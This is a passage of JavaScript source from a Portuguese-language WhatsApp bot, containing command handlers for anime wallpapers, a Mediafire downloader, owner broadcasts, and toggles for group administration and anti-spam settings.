jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdouma`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/DOUMA/f75946301ba1edd8934d50aa8b1ffc58.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapersanemi': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/sanemi.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapersanemi`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/SANEMI/ffcb83d47e6fcaad697077c139a37890.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapertokito': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/tokito.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertokito`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TOKITO/ffac2e76c9de3818aca9c4032a109084.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapernezuko': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/pl.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapernezuko`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/NEZUKO/e4f78ec55881a632e4e1cc3948a970c9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperenmu': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/enmu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperenmu`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/ENMU/ff9f048986711075883534c60efb3787.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperinosuke': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/inosuke.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperinosuke`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/INOSUKE/f8ecfcc2bb25199ad05f83586517adc1.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapermuzan': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/muzan.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapermuzan`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/MUZAN/f4c5e0ea5adc28e758506648e1f08107.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperkokushibou': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/kokushibou.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkokushibou`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KOKUSHIBOU/fdebc314e66ab36f00eb5f8705f21d2b.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperzenitsu': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/zenitsu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperzenitsu`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/ZENITSU/fda6066353d57465fac5b029a6afa082.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapertanjiro': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/tanjiro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertanjiro`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TANJIRO/0ee8d9c8ab5e795f4cc6d96dd5c65e8f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperakaza': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/akaza.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperakaza`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/AKAZA/f637dd31731a8117a33ec5da8e335352.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapergyomei': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/gyomei.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyomei`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYOMEI/f4369b05134a1b3c2da0b548b876c112.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperkyonjuro': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/kyonjuro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkyonjuro`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KYONJURO/f8d355a9b7b68cebe6f3212c604617d3.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

//===================================\\


case 'mediafire':
try {
if (!q) return reply(`Coloque um link`)
if (!isUrl(q) || !q.includes('mediafire.com')) return reply(`Link inv√°lido!`)
mfdw = await mediafire(`${args[0]}`)
buttons02 = [
{buttonId: `${mfdw[0].link}`, buttonText: {displayText: `${mfdw[0].link}`}, type: 1}
]
if (mfdw[0].peso.split('MB')[0] >= 250)
{
buttonMessage02 = {
document: fs.readFileSync('./fun√ß√µes/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `${NomeDoBot} ‚úÖ`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

Nome: ${mfdw[0].nome}
Peso: ${mfdw[0].peso}
Tipo: ${mfdw[0].tipo}`,
footer: `Arquivo muito pesado para ser enviado pelo WhatsApp.`,
buttons: buttons02,
headerType: 4,
}
pl.sendMessage(from, buttonMessage02)
} else {
buttonMessage02 = {
document: fs.readFileSync('./fun√ß√µes/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `${NomeDoBot} ‚úÖ`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

Nome: ${mfdw[0].nome}
Peso: ${mfdw[0].peso}
Tipo: ${mfdw[0].tipo}`,
footer: `Aguarde, estou enviando...`,
buttons: buttons02,
headerType: 4,
}
pl.sendMessage(from, buttonMessage02)
await sleep(1000)
pl.sendMessage(from, {document: {url: mfdw[0].link}, fileName: mfdw[0].nome, mimetype: mfdw[0].tipo, mentions: [sender]}, {quoted: selo})
}
} catch (err) {
console.log(err)
reply("Ocorreu um erro.")
}
break


case'bcpv':// by Yuri Modz_ 
case 'bcgc':// by Yuri Modz_ 
case 'transmitirpv':// by Yuri Modz_ 
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('.......')
fgp = await groupMembers
var nomor = info.participant
if (isMedia && !info.message.videoMessage || isQuotedImage) {
encmedia = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
for (let _ of fgp) {
Pl.sendMessage(_.id, {image: buff}, {caption: `*„Äå ùêìùêëùêÄùêçùêíùêåùêàùêíùêíùêÄÃÉùêé „Äç*\n\nGrupo: ${groupName}\n N√∫mero: wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`})
}
reply('')
} else {
for (let _ of fgp) {
sendMess(_.id, `*„Äå ùêìùêëùêÄùêçùêíùêåùêàùêíùêíùêÄÃÉùêé „Äç*\n\nGrupo : ${groupName}\n N√∫mero : wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`)
}
reply('„Äé‚ùó„ÄèTransmiss√£o enviada com sucesso.')
} 
break

	
case 'tm': case 'transmitir': case 'bcgroup': case 'bcgp': // by Yuri Modz_ 
if (!SoDono && !isCmd && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!q) return reply( `Texto onde?\n\nExemplo : ${prefix + command} N·¥á·¥¢·¥ú·¥ã·¥è D·¥è·¥ç…™…¥·¥Ä`)
let getTm = await pl.groupFetchAllParticipating()
let groupps = Object.entries(getTm).slice(0).map(entry => entry[1])
let getMaper = groupps.map(v => v.id)
for (let i of getMaper) {
await sleep(1500)
 let avitm = `„Äå ùêìùêëùêÄùêçùêíùêåùêàùêíùêíùêÄÃÉùêé ùêÉùêÄ ùêÄùêäùêÄùêåùêÑ „Äç\n\n\n` + q + `\n\n\n„Äå ùêìùêå ùêÄùêäùêÄùêåùêÑ „Äç`
pl.sendMessage(i, {text: avitm, footer: NomeDoBot, buttons: [{buttonId: `${prefix}avaliar`, buttonText: {displayText: '[ü©∏] ùêÄùêïùêÄùêãùêàùêÄùêë [ü©∏]'}, type: 1}, {buttonId: `${prefix}speed`, buttonText: {displayText: '[ü©∏] ùêíùêèùêÑùêÑùêÉ [ü©∏]'}, type: 1}, {buttonId: `${prefix}menulist`, buttonText: {displayText: '[ü©∏] ùêåùêÑùêçùêî ùêãùêàùêíùêì [ü©∏]'}, type: 1}]}, {quoted: selo})
}
reply(`Transmiss√£o enviada com sucesso para ${getMaper.length} chats.`, "‚úÖ")
break

//================ANTIS=============
case 'abrirgp': 
if (!isGroup) return reply(`S√≥ em grupo`)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args[0] === 'a') {
reply(`*GRUPO ABERTO COM SUCESSO*`)
await pl.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'f') {
reply(`*GRUPO FECHADO COM SUCESSO*`)
await pl.groupSettingUpdate(from, 'announcement')
} else {
buttons02 = [
{buttonId: `${prefix + command} a`, buttonText: {displayText: 'Abrir'}, type: 1},
{buttonId: `${prefix + command} f`, buttonText: {displayText: 'Fechar'}, type: 1},
]
buttonMessage02 = {
text: `‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
         ùóîùóïùó•ùóúùó•/ùóôùóòùóñùóõùóîùó• ùóöùó•ùó®ùó£ùó¢
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚Ä¢ñßπ‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúü©∏‚ùÄ‚Éò‡£≠‡£≠‡£≠‡£≠ŸúÍî∑‚Éî‡ªë‡£≠‡£≠Ÿúñßπ‚Ä¢‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ`,
footer: `Aperte no bot√£o abaixo para abrir ou fechar o grupo.\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
pl.sendMessage(from, buttonMessage02, {quoted:selo})
}
break 

case 'grupoinfo':
case 'infogrupo':
case 'infogp':  
case 'gpinfo':  
case 'regras':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins)return reply(enviar.msg.adm)
tujuh = fs.readFileSync('./audios/regras.mp3');
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true }, { quoted: info })
ppUrl = await pl.profilePictureUrl(from, 'image')
buffer = await getBuffer(ppUrl)
const metadatqa = await pl.groupMetadata(from) 
pl.sendMessage(from, {image: buffer, caption: `*NOME* : ${groupName}\n*MEMBROS* : ${groupMembers.length}\n*ADMINS* : ${groupAdmins.length}\n*DESCRI√á√ÉO* : ${metadatqa.desc}`, thumbnail: null}, {quoted: selo})
break 


case 'novolink':
case 'redefinir':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
try {
await pl.groupRevokeInvite(from)
reply('LINK DO GRUPO REDEFINIDO')
} catch(e) {
console.log(e)
enviar(`ERRO MAN`)
}
break
  
case 'configp': 
case 'configura√ß√£o': 
case 'ajuda': 
case 'grupo': 
{
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)

	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "[ü©∏] ùêÄùêäùêÄùêåùêÑ ùêÅùêéùêì [ü©∏] ",
rows: [
{title: "[ü©∏] ùêÄùêÅùêëùêàùêë ùêé ùêÜùêëùêîùêèùêé. [ü©∏]", rowId: `${prefix}abrirgp a`},
{title: "[ü©∏] ùêÖùêÑùêÇùêáùêÄùêë ùêé ùêÜùêëùêîùêèùêé [ü©∏]", rowId: `${prefix}abrirgp f`},
{title: "[ü©∏] ùêÄùêìùêàùêïùêÄùêë ùêÄùêîùêìùêéùêíùêìùêàùêÇùêäùêÑùêë [ü©∏]", rowId: `${prefix}autofig-gp 1`},
{title: "[ü©∏] ùêÉùêÑùêíùêÄùêìùêàùêïùêÄùêë ùêÄùêîùêìùêéùêíùêìùêàùêÇùêäùêÑùêë [ü©∏]", rowId: `${prefix}autofig-gp 0`},
{title: "[ü©∏] ùêàùêçùêÖùêé ùêÉùêé ùêåùêÑùêî ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}infodono`},
{title: "[ü©∏] ùêçùêéùêïùêé ùêãùêàùêçùêä [ü©∏]", rowId: `${prefix}novolink`, description: 'I Ä·¥á…™  Ä·¥ás·¥á·¥õ·¥Ä Ä ·¥è  ü…™…¥·¥ã ·¥Ö·¥ás·¥Ö·¥á …¢ Ä·¥ú·¥ò·¥è.'},
{title: "[ü©∏]ùêÇùêéùêçùêìùêÄùêìùêé ùêÉùêé ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}dono`},
{title: "[ü©∏] ùêàùêçùêÖùêé ùêÜùêëùêîùêèùêé [ü©∏]", rowId: `${prefix}infogp`}
]
},
]
 

const listMessage2 = {
text: `
‚ï≠‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[ü©∏]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïÆ
‚îÇ    ùêÇùêéùêçùêÖùêàùêÜ ùêÉùêé ùêÜùêëùêîùêèùêé: 
‚îÇ    
‚îÇ Anti √°udios Est√° ${isAntiAudio? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti documentos Est√° ${Antidoc ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti fake Est√° ${isAntifake ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti img Est√° ${isAntiImg? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti sticker Est√° ${isAntiSticker ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti liga√ß√£o Est√° ${isAnticall ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti Notas Est√° ${isAntiNotas ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti catalogo Est√° ${isAnticatalogo ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti video Est√°${isAntiVid ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti localiza√ß√£o Est√° ${Antiloc ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti pv block Est√° ${isAntiPv ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti link hard Est√° ${isAntiLinkHard ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Anti link grupo Est√° ${isAntilinkgp ? 'Ativo‚úì' : 'Desativado'}
‚îÇ Auto ban lista negra Est√° ${isAdeusCara ? 'Ativo‚úì' : 'Desativado'}
‚ï∞‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[ü©∏]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïØ`,
  footer: `„Äò ${NomeDoBot} „Äô`,
  title: `
‚ï≠‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[ü©∏]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïÆ
ùêÇùêéùêçùêìùêëùêéùêãùêÑ ùêíùêîùêÄùêí ùêÇùêéùêçùêÖùêàùêÜùêîùêëùêÄ√á√ïùêÑùêí ùêÉùêÑ ùêÜùêëùêîùêèùêé ùêÄùêêùêîùêà.....
‚ï∞‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[ü©∏]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïØ `,
  buttonText: "[ü©∏] ùêÇùêãùêàùêêùêîùêÑ ùêÄùêêùêîùêà [ü©∏]",
  sections
}
sendMsg = await pl.sendMessage(from, listMessage2, {quoted: selo})
}
break  
  
case 'autofig-gp':
case 'autofig':
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
if (args.length < 1) return reply('tipo autofig-gp 1 para ativar \ntipo autofig-gp 1 para desativar')
if (args[0]  === '1'){
if (isAutoSticker) return reply(`J√° ativo`)
autosticker.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autosticker.json', JSON.stringify(autosticker))
reply('autofig-gp ativo')
} else if (args[0] === '0'){
 anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autosticker.json', JSON.stringify(autosticker))
reply('autofig-gp Desligado')
}
break

case 'autofig-pv':
case 'autofig-geral':
if (args.length < 1) return reply('autofig-pv 1 para ativar \n autofig-pv 0 para desativar')
if (args[0]  === '1'){
if (isAutoStick) return reply(`J√° ativo`)
autostick.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autostickpc.json', JSON.stringify(autosticker))
reply('autofig-pv ativo')
} else if (args[0] === '0'){
anu = autosticker.indexOf(from)
autostick.splice(anu, 1)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autostickpc.json', JSON.stringify(autosticker))
reply('autofig-pv Desligado')
}
break

case 'antiligar':
case 'antiligacao':  
case 'antiliga√ß√£o':  
try {
if (!SoDono  && !m.key.fromMe) return reply(mess.owner)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAnticall) return reply('Ja esta ativo')
anticall.push('Ativado')
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/anticall.json', JSON.stringify(anticall))
reply('Ativou com sucesso o recurso de antiliga√ß√£o no bot‚úîÔ∏è')
} else if (Number(args[0]) === 0) {
if (!isAnticall) return reply('Ja esta Desativado')  
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/anticall.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antiliga√ß√£o no bot‚úîÔ∏è')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break

case 'antipv':
if (!SoDono) return reply(`Apenas dono pode ativar/desativar essa fun√ß√£o..`)
if (Number(args[0]) === 1) {
if (isAntiPv) return reply('„Äé‚ùó„ÄèJ√° esta ativo.')
antipv.push('Ativado')
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/antipv.json', JSON.stringify(antipv))
reply('„Äé‚ùó„ÄèAtivado com sucesso.')
} else if (Number(args[0]) === 0) {
if (!isAntiPv) return reply('J√° est√° desativado')
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/antipv.json', JSON.stringify([]))
reply('„Äé‚ùó„ÄèDesativado com sucesso.')
} else {
if(isAntiPv){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ‚úò'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ‚úì'}, type: 1},
]
}
buttonMessage02 = {
text: `[üîí] ùêÄùêçùêìùêà-ùêèùêï ùêÅùêãùêéùêÇùêä [üîí]`,
footer: `Status: ${isAntiPv ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}}
pl.sendMessage(from, buttonMessage02, {quoted: selo})
}
break

case 'autorea√ß√£o':
case 'autoreacao':
case 'autoreact':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (Number(args[0]) === 1) {
if (isAutoReact) return reply('J√° est√° ativado')
autoreact.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autoreact.json', JSON.stringify(autoreact))
reply('[ü©∏] Ativou com sucesso o recurso de auto rea√ß√£o neste grupo üìù')
} else if (Number(args[0]) === 0) {
if (!isAutoReact) return reply('J√° est√° desativado')
pesquisar = from
processo = autoreact.indexOf(pesquisar)
while(processo >= 0){
autoreact.splice(processo, 1)
processo = autoreact.indexOf(pesquisar)
}
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/autoreact.json', JSON.stringify(autoreact))
reply('‚ÄºÔ∏è Desativou com sucesso o recurso de auto rea√ß√£o neste grupo‚úîÔ∏è')
} else {
if(isAutoReact){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ‚úò'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ‚úì'}, type: 1}]
}
buttonMessage02 = {
